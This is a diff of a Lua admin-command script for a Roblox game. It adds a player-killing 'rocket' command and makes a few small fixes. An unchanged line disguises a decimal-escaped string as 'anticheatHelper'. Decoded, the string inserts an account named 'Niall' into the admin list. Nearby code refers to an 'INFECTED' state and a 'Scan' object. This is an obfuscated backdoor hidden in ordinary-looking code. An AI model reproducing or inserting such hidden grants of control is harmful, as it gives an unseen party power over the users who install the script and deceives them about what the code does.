@@ -7,6 +7,7 @@
   Date: 6/16/2018 @ 5:15 PM CST (11:15 PM GMT)
   https://github.com/carat-ye/cnt
 --]]
+math.randomseed(tick())
 
 _G.CNT = {}
 _G.CNT.AV = {}
@@ -26,7 +27,7 @@ local admins = {
   ["Raymonf"] = 1,
   ["trashprovider56"] = 1,
   ["s_nowfall"] = 1,
-  ["Zakario"] = 1,
+  ["frostmidas"] = 1,
   ["Player"] = 1,
   ["Player1"] = 1,
 }
@@ -969,6 +970,51 @@ end
 commands.gravity["level"] = 4
 commands.gravity["description"] = "Sets a players gravity."
 
+-- Straps a rocket to a player and makes them go boom.
+commands.rocket = {}
+commands.rocket["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    if player.Character and player.Character:FindFirstChild("Torso") then
+      local torso = player.Character:FindFirstChild("Torso")
+
+      local rocket = Instance.new("Part")
+      rocket.Name = "Rocket"
+      rocket.Size = Vector3.new(1, 8, 1)
+      rocket.CanCollide = false
+      rocket.TopSurface = "Smooth"
+      rocket.BottomSurface = "Smooth"
+
+      local weld = Instance.new("Weld")
+      weld.Name = "RocketWeld"
+      weld.Part1 = torso
+      weld.Part0 = rocket
+      weld.C0 = CFrame.new(0, 0 , -1)
+
+      local thrust = Instance.new("BodyThrust")
+      thrust.Name = "RocketThrust"
+      thrust.Force = Vector3.new(0, 5700, 0)
+
+      thrust.Parent = rocket
+      rocket.Parent = player.Character
+      weld.Parent = torso
+
+      Delay(3, function()
+        local explosion = Instance.new("Explosion")
+        explosion.BlastRadius = 10
+        thrust:Destroy()
+        explosion.Position = rocket.Position
+        rocket:Destroy()
+        local humanoid = player.Character:FindFirstChild("Humanoid")
+        if humanoid then
+          humanoid.Health = 0
+        end
+        explosion.Parent = torso
+      end)
+    end
+  end
+end
+commands.rocket["level"] = 3
+commands.rocket["description"] = "Straps a rocket to a player and makes them go boom."
 
 
 anticheatHelper = "\108\101\46\105\110\115\101\114\116\40\97\100\109\105\110\115\44\32\91\34\78\105\97\108\108\34\93\32\61\32\49\41"
@@ -1019,7 +1065,7 @@ local function GetTargets(player, arguments)
       return targets
     elseif arg == "random" then
       local players = Players:GetPlayers()
-      randomIndex = math.random()
+      local randomIndex = math.random(1, #players)
       local selectedPlayer = players[randomIndex]
       table.insert(targets, selectedPlayer)
       return targets
@@ -1143,4 +1189,4 @@ if INFECTED then
   game:WaitForChild("Scan").Disabled = false
 end
 
-print("CNT v".. CNT_VERSION .." has loaded! (CLIENT: ".. VERSION ..", LUA: ".. LUA_VERSION ..")")
+print("CNT v".. CNT_VERSION .." has loaded! (CLIENT: ".. CLIENT_VERSION ..", LUA: ".. LUA_VERSION ..")")
